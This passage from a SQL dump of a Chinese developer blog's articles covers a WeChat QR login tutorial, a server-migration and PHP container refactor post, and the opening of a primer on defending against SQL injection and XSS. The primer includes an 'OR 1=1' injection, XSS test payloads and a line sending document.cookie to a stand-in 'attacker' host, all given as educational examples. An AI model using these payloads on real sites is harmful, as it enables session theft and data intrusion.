sp;&nbsp;&nbsp;}else{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contentStr&nbsp;&nbsp;=&nbsp;&quot;sorry,网站并没有你的帐号，请联系管理员。openid是:&quot;.$object-&gt;FromUserName;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;break;\r\n&nbsp;&nbsp;&nbsp;\r\n#这是根据openid获取用户数据的方法，上面有用到(要先获取access_token，方法跟上面一样)\r\npublic&nbsp;function&nbsp;get_user_info($openid){&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;$url&nbsp;=&nbsp;&quot;https://api.weixin.qq.com/cgi-bin/user/info?access_token=&quot;.$access_token.&quot;&amp;openid=&quot;.$openid.&quot;&amp;lang=zh_CN&quot;;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;$res&nbsp;=&nbsp;https_request($url);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;return&nbsp;json_decode($res,&nbsp;true);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n}</code></pre><p>第三步，前台的数据遍历。这是在登录页面的js代码</p><pre><code class=\"language-css\">var&nbsp;scene_id&nbsp;=&nbsp;//在页面生成的scene_id\r\nvar&nbsp;setIntervalFun&nbsp;=&nbsp;null;&nbsp;\r\nfunction&nbsp;setweixin(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;//由setInterval执行遍历\r\n&nbsp;&nbsp;&nbsp;&nbsp;setIntervalFun&nbsp;=&nbsp;setInterval(function(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;//ajax向后台查询，如果查询到数据这条登录数据，返回成功后则销除数据库储存的那条数据。\r\n&nbsp;&nbsp;&nbsp;&nbsp;$.post(&quot;http://520.leunico.sinaapp.com/******?scene_id=&quot;+scene_id,function(data){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(data&nbsp;==&nbsp;&#39;sucess&#39;){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&#39;#wx_default_tip&#39;).children().first().css(&#39;color&#39;,&#39;#27ae60&#39;).text(&#39;扫描成功，请等待跳转！&#39;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//成功取得数据跳转到后台页面\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;setTimeout(function(){location.href=&quot;http://520.leunico.sinaapp.com/******&quot;;},1500);&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}});&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;},2000);\r\n}\r\n//超过一定时间没有登录则停止数据遍历。\r\n$(document).ready(function(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;setweixin();\r\n&nbsp;&nbsp;&nbsp;&nbsp;setTimeout(function(){\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(setIntervalFun&nbsp;!=&nbsp;null){&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;clearInterval(setIntervalFun)\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&#39;#wx_default_tip&#39;).children().first().css(&#39;color&#39;,&#39;#19a7f0&#39;).text(&#39;超过1分钟已失效，请刷新！&#39;);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;},60000);\r\n});</code></pre><p>OK，大功告成！这个方法说不上好和坏吧，我就不评判了，优点缺点肯定都会有的~~</p><p>这是本网站的登录</p><p><img src=\"http://leunico-upload.stor.sinaapp.com/image/20151218_1450416615_826987.png\" title=\"20151218_1450416615_826987.png\" alt=\"QQ截图20151218114046.png\" width=\"572\" height=\"373\" style=\"width: 572px; height: 373px;\"/></p><p><img src=\"http://leunico-upload.stor.sinaapp.com/image/20151218_1450410217_738087.png\" title=\"20151218_1450410217_738087.png\" alt=\"QQ截图20151218114216.png\"/></p><p>本文原创。</p>',1446091425,'2016-11-15 17:59:45','0000-00-00 00:00:00',21,4,2,6,'http://7xq09h.com1.z0.glb.clouddn.com/20151218_1450403060_184868.jpg?imageView2/1/w/210/h/140'),(117,1,'left','一只特立独行的猪2号','服务器搬家到阿里云，重构网站代码记录','为了方便自己开发和学习，网站搬家到了阿里云，使用的是Lnmp环境，然后不定时的更新和重构网站代码，运营一个小博客网站来一边学习一边进步吧！源码地址https://github.com/leunico/aliceBlog，请多多指教！！','PHP博客架构','博客仿照部分框架架构内容写成的~','博客，架构','博客',437,'<p><img style=\"border-radius:4px\" src=\"http://lzxya.kssws.ks-cdn.com/image_1455591439556287.jpg@base@tag=imgScale&q=100&w=690\" title=\"1455591439556287.jpg\" alt=\"76.jpg\"/></p><p>原来博客是在新浪云上写的，因为工作需要，开发微信公众平台时使用了新浪云，所以当时写博客也就干脆在新浪云写的,这是新浪云博客的链接<a href=\"http://520.leunico.sinaapp.com/\" target=\"_blank\" title=\"点我\" textvalue=\"Alice博客1.0\">Alice博客1.0</a>。但是,到了后期，用新浪云作为一个网站服务器的话...讲真，各种不方便。环境自己没法操作，更重要是各种扣云豆！！！于是，我选择搬家。</p><p>搬到了阿里云服务器，阿里云应该说是现在比较主流的服务器吧，各方面都比较方便（赞）。环境我用的是LNMP，Nginx性能强劲，配置起来也方便。另外使用了金山云储存，把Ueditor整合了一下，原有的代码也修改了，在Git上传了源码,这是地址：<a href=\"https://github.com/leunico/aliceBlog\" target=\"_blank\" title=\"源码点我啊\" textvalue=\"Git_Alice博客\">Git_Alice博客</a>。</p><h2>2016-03-30更新记录</h2><h3>(1)更改云储存服务商（七牛）</h3><p>原来是用金山云的，其实金山云和七牛云注册后都会送一系列的空间和流量，没用七牛是注册后要实名认证，耽误了时间，然后我就先用金山去了。。。一开始我就把百度Ueditor和这两个云储存整合好了，可以在配置文件切换着用，所以前段时间我一直使用的是金山云，直到有一天我收到一条短信说金山云我已经使用三个月了，如果不办理正式用户就停掉我的空间balabala之类的，我当时就懵蔽了，我可是放了数据在那上面啊，说好的送空间免费使用呢！无奈的我只好赶紧冲钱去办理去，然而我又懵蔽了。那网站都还没有开通办理通道，只能打电话给客服办理。。不得不说句妈的智障！于是我打电话了啊，客服听闻我不是企业办理立马就敷衍起来了，说是会给我分一个专门的商务代理人跟进，然而并没有！来来回回三次电话都还没分到什么人，果断弃之。</p><p>然后只能转移数据改代码了，投入了七牛云的怀抱哈哈，主要云储存这东西大同小异，SDK也简单，所以改起来挺方便的，所以导致我的网站现在兼容两种云储存了。</p><h3 style=\"white-space: normal;\">(2)修改Model层代码（容器）</h3><p>原来这网站的流程是经典的MVC<br/></p><p>路由映射-&gt;<code>Controller</code>(传递到视图)-&gt;<code>Model</code>（数据），有个弊端就是每个控制器要使用一个或多Model层操作文件都要use进来（命名空间），而且Model层引入的实例数据库类Example对每个Model的方法都要重新创建一个实例(new Example(table))，这样就增大内存开销了，并没有发挥好Mysql操作文件单例模式的好处，于是我就改进改进。</p><p>现在在C层初始化的时候向它的父类注入(DI)一个空的容器，然后在路由映射到控制器对应方法的同时，它所继承的父类会在容器内注册所有的Model类和一系列操作类（缓存、邮箱、云储存等），这个时候类并没有初始化，它只是注册在这个容器里面，这里面就要用到这两个魔术方法了：<code>__set;__get</code>和php的反射机理<code>ReflectionClass</code>类</p><pre><code class=\"language-css\">//引入系统内置的反射类\r\nuse&nbsp;ReflectionClass;\r\n\r\nclass&nbsp;Container&nbsp;&nbsp;&nbsp;&nbsp;\r\n{&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//储存注册的类名和对应的‘键’\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$app&nbsp;=&nbsp;array();\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//储存初始化构造函数需要的参数值&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;private&nbsp;$instances&nbsp;=&nbsp;array();&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//当给一个类不存在的对象赋值时会触发这个方法，注册用&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__set($key,&nbsp;$concrete)&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;app[$key]&nbsp;=&nbsp;$concrete;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//当获取一个不存在的对象时会触发这个方法，实例化你所需要的类时就会用到&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;__get($key)&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;build($this-&gt;app[$key]);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//当实例化的类需要初始化参数时就可用make方法进行注册&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;make($abstract,&nbsp;$parameters)&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;instances&nbsp;=&nbsp;$parameters;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$this-&gt;build($this-&gt;app[$abstract]);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;function&nbsp;build($className)&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//闭包函数直接返回\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($className&nbsp;instanceof&nbsp;Closure)&nbsp;{&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//执行闭包函数，并将结果&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$className($this);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//这里就要用到反射了，先初始化&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$reflector&nbsp;=&nbsp;new&nbsp;ReflectionClass($className);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//检查注册的类是否可实例化,&nbsp;排除抽象类abstract和对象接口interface&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(!$reflector-&gt;isInstantiable())&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw&nbsp;new&nbsp;Exception(&#39;Error:Can\\&#39;t&nbsp;instantiate&nbsp;this.&#39;);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//获取类的构造函数&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$constructor&nbsp;=&nbsp;$reflector-&gt;getConstructor();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//若无构造函数，直接实例化并返回&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(is_null($constructor))&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;new&nbsp;$className();&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//若使用make方法注册时给出了初始化参数\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($this-&gt;instances)&nbsp;{\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//传入初始化参数并实例化这个类返回&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$reflector-&gt;newInstanceArgs($this-&gt;instances);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//下面就是递归解析要实例的类需要的参数，这一步其实完全可以通过上面make方法避免，就不多解释了。\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//取构造函数参数,通过ReflectionParameter数组返回参数列表&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$parameters&nbsp;=&nbsp;$constructor-&gt;getParameters();\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//递归解析构造函数的参数&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$dependencies&nbsp;=&nbsp;$this-&gt;getDependencies($parameters);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$reflector-&gt;newInstanceArgs($dependencies);&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;}\r\n&nbsp;&nbsp;&nbsp;&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;//...getDependencies方法\r\n&nbsp;}</code></pre><p>再到Model层，此时我增加了一个构造函数，只实例化一次Example数据操作类，如果这个Model要对多个表操作的话只要通过另外一个方法临时更改对表的绑定就行，这是一个连贯操作类，这样我就解除了对Model层的依赖和减少了相关类的实例次数。<br/></p><h3 style=\"white-space: normal;\">(3)规范部分代码</h3><p>对此我只想说，因为我是用Brackets这IDE开发的，这编辑器对php开发真是一点都不友好，Tab和空格傻傻分不清。。。还是sublime大法好！<br/></p><p>下一步准备更新请求和响应处理相关的类，我不爽它们很久了哈哈哈~</p><p><br/></p><p>待更新...</p>',1455592015,'2016-11-15 17:59:37','0000-00-00 00:00:00',10,0,1,6,'http://lzxya.kssws.ks-cdn.com/image_1455591439556287.jpg?imageView2/1/w/210/h/140'),(127,0,'backend','一只特立独行的猪2号','如何确保你的网站和网页的安全','从技术到安全，这是一个趋势，以前追求的是比较炫酷的技术，等实现过后发现，自己还能做什么。炫技完了之后,差不多就该到悟道的时候了。用户安全，就是一个很大的禅，而网页安全又是一个巨坑。基本上没有大量的时间和精力投入，你基本上是爬不出来的。那这个坑有多深呢？我这里挖了浅浅的一层土。','如何确保你的网站和网页的安全','从技术到安全，这是一个趋势，以前追求的是比较炫酷的技术，等实现过后发现，自己还能做什么。炫技完了之后,差不多就该到悟道的时候了...','安全，网页','网站安全',239,'<p><img style=\"border-radius:4px\" src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459915039846369.jpg\" title=\"1459915039846369.jpg\" alt=\"22.jpg\"/></p><p>从技术到安全，这是一个趋势，以前追求的是比较炫酷的技术，等实现过后发现，自己还能做什么。炫技完了之后,差不多就该到悟道的时候了。用户安全，就是一个很大的禅，而网页安全又是一个巨坑。基本上没有大量的时间和精力投入，你基本上是爬不出来的。那这个坑有多深呢？我这里挖了浅浅的一层土，给大家看看。</p><h2>SQL注入攻击</h2><p>根据名字, 我们大致可以猜测到。这个攻击是和sql数据库相关的(关系型数据库)。<br/></p><p>系统的解释一下,&nbsp;sql注入: 指的是攻击者注入一段恶意的脚本, 然后执行他想要的结果。比如获取到该db里面所有的数据，删除数据库数据。(由于, 后台给前台开放的接口通常只是作为查询使用, 所有 获取db 所有数据这类攻击比较常见)。</p><h3>实例攻击</h3><p>这类攻击通常发生在，后台使用动态脚本生成sql query string。而且, 途中不经过混淆处理。如下:</p><pre><code class=\"language-css\">var&nbsp;name&nbsp;=&nbsp;req.query.userName;\r\nvar&nbsp;pass&nbsp;=&nbsp;req.query.password;\r\nsql&nbsp;=&nbsp;&quot;SELECT&nbsp;id&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;username=&#39;&quot;&nbsp;+&nbsp;uname&nbsp;+&nbsp;&quot;&#39;&nbsp;AND&nbsp;password=&#39;&quot;&nbsp;+&nbsp;pass&nbsp;+&nbsp;&quot;&#39;&quot;;\r\ndatabase.execute(sql);</code></pre><p>然后，attacker可以写入如下的sql query string:</p><pre><code class=\"language-css\">&quot;SELECT&nbsp;id&nbsp;FROM&nbsp;users&nbsp;WHERE&nbsp;username=’username’&nbsp;AND&nbsp;password=’pass’&nbsp;OR&nbsp;1=1&quot;;</code></pre><p>额...结果的话, 你应该懂的。上面sql injection只是一个比较友好的入侵(这算是良心黑客)。如果你的sql statement的操作权限不仅仅只限于查询，还包括CRUD操作的话。那么hacker能做的就大了去了。</p><ul class=\" list-paddingleft-2\"><li><p>如果你的接口涉及修改。当hacker inject了一段代码，破坏你的数据的完整性。这种情况可能造成，其他查询时，会出现无效查询的结果。(void transaction)，甚至返回别人的数据。</p></li><li><p>如果你的接口涉及删除。那结果我就不多说了。</p></li><li><p>另外, 还有一些关于admin或者visitor的权限分配。这也是考察数据库安全性的一个标准。</p></li></ul><h3>SQL 防护</h3><p>第一类方法， 算是一个比较笨笨的。通过一个blacklists正则匹配，检测 query string里面的参数, 将一些可以字符排除掉。</p><p>第二类方法，也是最常用的。使用数据库自带的一系列函数进行查询。这个应该不用多说，数据库自带库的函数内部对参数的处理，一定比我们重复造轮子检测正确性高~ 。<br/></p><p>相关文章：<a href=\"http://blog.csdn.net/wusuopubupt/article/details/8818996\" target=\"_blank\" title=\"手把手叫你SQL注入攻防\">手把手叫你SQL注入攻防</a><br/></p><h2>XSS攻击</h2><p>XSS(Cross-site scripting)。你问我为什么不是CSS? 我也不知道。<br/></p><p>XSS主要是指跨脚本攻击, 其实就相当于执行js脚本。经常出现在评论回复的逻辑页面中。就是评论里面添加以下形式的内容：</p><pre><code class=\"language-css\">&lt;script&gt;alert(&#39;Hello&nbsp;Xss!&#39;)&lt;/script&gt;</code></pre><h3>XSS 原理</h3><p>我们先理解一下, 评论回复的流程。正常情况下:</p><ol class=\" list-paddingleft-2\"><li><p>用户评论的内容comment。</p></li><li><p>异步发送给Server, server 将其存储在数据库中。成功时, 则返回新加的评论comment。</p></li><li><p>此时, 使用<code>&lt;p&gt;comment&lt;/p&gt;</code>将评论渲染出来。</p></li></ol><p>上面一个流程可以很容易的说明一个道理, 即没有对comment进行任何的处理. 在这种情况下, XSS简直就是如鱼得水如下:</p><pre><code class=\"language-css\">//comment为:&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;console.log(123);&lt;/script&gt;\r\n\r\n//渲染出来的内容为:\r\n&lt;p&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console.log(123);\r\n&nbsp;&nbsp;&nbsp;&nbsp;&lt;/script&gt;\r\n&lt;/p&gt;</code></pre><p>最终渲染到页面上的结果是, p里面的内容为空，控制台输出了123。<br/>实际上, 评论已经被保存在数据库。当其他用户访问时，该评论中的script脚本同样会发生作用。(可怕ing) 这才是, XSS 攻击最让人头疼的地方。下图是基本运作流程图:</p><p><img src=\"http://7xq09h.com1.z0.glb.clouddn.com/qimg_1459915087768338.png\" title=\"1459915087768338.png\" alt=\"4.png\"/></p><p>XSS 其实, 不仅仅只有script这个东西可以使用。凡是涉及用户输入并且渲染到页面上的，都有可能被XSS。所以下面就是针对标签属性进行XSS 攻击。这类方式的防止很好解决。就是使用setAttribute方法进行设置即可。</p><table><thead><tr class=\"firstRow\"><th>模板</th><th>实际渲染</th></tr></thead><tbody><tr><td>&lt; img src=usrInput&gt;</td><td>&lt; img src=&quot;#&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</td></tr><tr><td>&lt; iframe src=usrInput&gt;</td><td>&lt; iframe src=&quot;http://xss.html&quot;&gt;</td></tr><tr><td>&lt; input type=userInput&gt;</td><td>&lt; input type=&quot;image&quot; src=&quot;#&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</td></tr><tr><td>background插入</td><td>background:url(javascript:alert(XSS));</td></tr><tr><td>...</td><td>...</td></tr></tbody></table><h3>XSS 能做什么?</h3><p>通过将脚本嵌套在正规页面上, 用户在打开该页面时, 根本无法察觉自己已经变成XSS&#39;s victim。所以当用户打开网站时，malicious脚本便会执行。该脚本通常能做的事情：</p><ul class=\" list-paddingleft-2\"><li><p>通过document.cookie 获取用户的cookie信息。而且如果你的token不是放在Server端，而是放在用户cookie中，那么hacker 就完全获得该用户的信息, 假冒用户进行登录。比如：<code>window.location=&#39;http://attacker/?cookie=&#39;+document.cookie</code></p></li><li><p>脚本能够对界面进行修改</p></li><li><p>如果页面上有用户输入的私密信息，比如银行账号,密码等。就可以绑定监听， 并通过ajax将信息发送给hacker. (跨域完全可以通过<a href=\"https://segmentfault.com/a/1190000004682473#articleHeader15\" target=\"_blank\">CORS</a>解决)</p></li><li><p>使用H5的相关API, 获得用户的人身信息。比如，摄像头，地理位置等。当然用户也不是傻, 不会平白无故的就把确认点了(使用这些API时, 需要获取用户的同意)。</p></li><li><p>地址的重定向，这应该不用过多解释。只要使用<code>window.location.href</code>即可。</p></li></ul><h3>Prevent XSS Attack</h3><p>现在，我们已经知道xss的原理，即通过嵌入script脚本，执行恶意的操作。所以，最基本的防护可以分为两种:</p><ul class=\" list-paddingleft-2\"><li><p>验证: 通过验证用户输入的内容，是否符合规则。防止hacker插入，恶意代码。</p></li><li><p>Encoding：其实就相当于字符的转义。比如：将&#39;&lt;&#39; 转换为: &amp;lt &#39;&gt;&#39;转换为: &amp;gt(防止插入&lt;script&gt;或者其他标签</p></li></ul><p>验证：实际上，验证可以分为blacklist和whitelist验证。不过，blacklist只是作为介绍，在正式开发中最常使用的应该算是whitelist。</p><ul class=\" list-paddingleft-2\"><li><p><span style=\"box-sizing: border-box; font-weight: 700;\">blackList</span><br style=\"box-sizing: border-box;\"/>这种方法其实就相当于枚举法，只是，他猜测的方向是针对hacker用户。比如，设置一个正则<code>/&lt;script/g</code>使用replace进行替换，或者弹出提醒框。</p></li><li><p><span style=\"box-sizing: border-box; font-weight: 700;\">whitelist</span><br style=\"box-sizing: border-box;\"/>这和blacklist一样, 只是里面设置的是对正确内容的验证。该方法，主要是注册时候使用。对用户名，昵称等信息，使用相关的正则表达式进行验证。这就是典型的whitelist方法。</p></li></ul><p>Encoding：这个方法就比较实诚了，没有浮夸的正则。就是一些自定义的convert。其实就相当于字符的转义。其实就相当于字符的转义。比如：将&#39;&lt;&#39; 转换为:<code>&amp;lt.</code> &#39;&gt;&#39;转换为:<code>&amp;gt.</code>(防止插入&lt;script&gt;或者其他tag&lt;p&gt;&lt;/p&gt;</p><p>这样就可以防止嵌入的scipt脚本执行，使其变为data直接渲染到页面上。下面我们针对不同的场景具体说明一下, XSS保护的措施。</p><h3>针对标签属性的XSS防护</h3><p>在讲解标签防护之前，我再把上面的XSS attack实例搬下来:</p><table><thead><tr class=\"firstRow\"><th>模板</th><th>实际渲染</th></tr></thead><tbody><tr><td>&lt; img src=usrInput&gt;</td><td>&lt; img src=&quot;#&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</td></tr><tr><td>&lt; iframe src=usrInput&gt;</td><td>&lt; iframe src=&quot;http://xss.html&quot;&gt;</td></tr><tr><td>&lt; input type=userInput&gt;</td><td>&lt; input type=&quot;image&quot; src=&quot;#&quot; onerror=&quot;alert(&#39;XSS&#39;)&quot;/&gt;</td></tr><tr><td>...</td><td>...</td></tr></tbody></table><p>上面提到了，可以使用setAttribute进行内部的encoding。在client-side 还有其他方法可以实现。</p><table width=\"-49\"><thead><tr class=\"firstRow\"><th>用户输入</th><th>转义方法</th><th width=\"116\" style=\"word-break: break-all;\"><br/></th></tr></thead><tbody><tr><td>&lt; p&gt;usrInput&lt; /p&gt;</td><td>eleP.textContent=usrInput</td><td width=\"116\"><br/></td></tr><tr><td>&lt; p attr&gt;</td><td>ele.setAttribute(attr,usrInput)\\</td><td width=\"116\">ele[attr]=usrInput</td></tr><tr><td>URL param</td><td>window.encodeURLComponent(usrInput)</td><td width=\"116\"><br/></td></tr><tr><td>style value</td><td>ele.style.prop = usrInput</td><td width=\"116\"><br/></td></tr></tbody></table><p>简而言之就是尽量在操作用户输入的数据的时候，减少innerHTML和outerHTML出现的频次。</p><h3>对于input内容进行防护</h3><p>这个主要就是针对于评论内容了。不过由于内容过于复杂，这里就不详述。大概就是上面的几点，以及字符的转化，推荐使用<a href=\"http://jsxss.com/en/index.html\" target=\"_blank\">XSS 